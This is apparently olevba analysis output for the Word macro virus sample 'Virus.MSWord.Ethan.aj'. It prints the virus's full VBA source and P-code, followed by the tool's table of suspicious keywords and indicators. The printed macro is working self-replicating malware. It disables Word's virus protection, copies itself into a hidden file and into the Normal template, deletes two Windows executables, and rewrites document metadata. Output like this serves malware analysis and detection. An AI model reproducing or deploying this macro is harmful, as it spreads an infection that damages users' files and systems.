olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.aj
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.aj - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
S = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize
If Dir("c:\johnny.___", 6) = "" Then
Open "c:\johnny.___" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
A = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, A
Next i
Close #1
SetAttr "c:\johnny.___", 6
End If
If Dir("c:\windows\cdplayer.exe") <> "" Then Kill "c:\windows\cdplayer.exe"
If Dir("c:\windows\winpopup.exe") <> "" Then Kill "c:\windows\winpopup.exe"
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = ""
End If
If t <> "" Then
Open "c:\johnny.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, A
t.CodeModule.InsertLines i, A
i = i + 1
Loop
q:
Close #1
If Rnd < 1 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Johnny Killer": .Author = "DeathJohnny": .Keywords = "Johnny is Back": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> S Then ActiveDocument.Saved = S
MsgBox "Johnny version 1.0"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ethan.aj
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3513 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St S 
' Line #3:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #4:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #5:
' 	ArgsCall Read 0x0000 
' Line #6:
' 	LitStr 0x000D "c:\johnny.___"
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #7:
' 	LitStr 0x000D "c:\johnny.___"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #8:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #9:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St A 
' Line #10:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld A 
' 	PrintItemNL 
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #13:
' 	LitStr 0x000D "c:\johnny.___"
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	LitStr 0x0017 "c:\windows\cdplayer.exe"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0017 "c:\windows\cdplayer.exe"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #16:
' 	LitStr 0x0017 "c:\windows\winpopup.exe"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0017 "c:\windows\winpopup.exe"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #17:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	IfBlock 
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #19:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	ElseIfBlock 
' Line #20:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #21:
' 	ElseBlock 
' Line #22:
' 	LitStr 0x0000 ""
' 	St t 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #25:
' 	LitStr 0x000D "c:\johnny.___"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #26:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo q 
' 	EndIf 
' Line #27:
' 	LitDI2 0x0001 
' 	St i 
' Line #28:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #29:
' 	LitDI2 0x0001 
' 	Ld A 
' 	LineInput 
' Line #30:
' 	Ld i 
' 	Ld A 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #31:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #32:
' 	Loop 
' Line #33:
' 	Label q 
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #35:
' 	Ld Rnd 
' 	LitDI2 0x0001 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' 	LitStr 0x000D "Johnny Killer"
' 	MemStWith Title 
' 	BoS 0x0000 
' 	LitStr 0x000B "DeathJohnny"
' 	MemStWith Author 
' 	BoS 0x0000 
' 	LitStr 0x000E "Johnny is Back"
' 	MemStWith Keywords 
' 	BoS 0x0000 
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' 	EndIf 
' Line #36:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld S 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld S 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #39:
' 	LitStr 0x0012 "Johnny version 1.0"
' 	ArgsCall MsgBox 0x0001 
' Line #40:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |cdplayer.exe        |Executable file name                         |
|IOC       |winpopup.exe        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

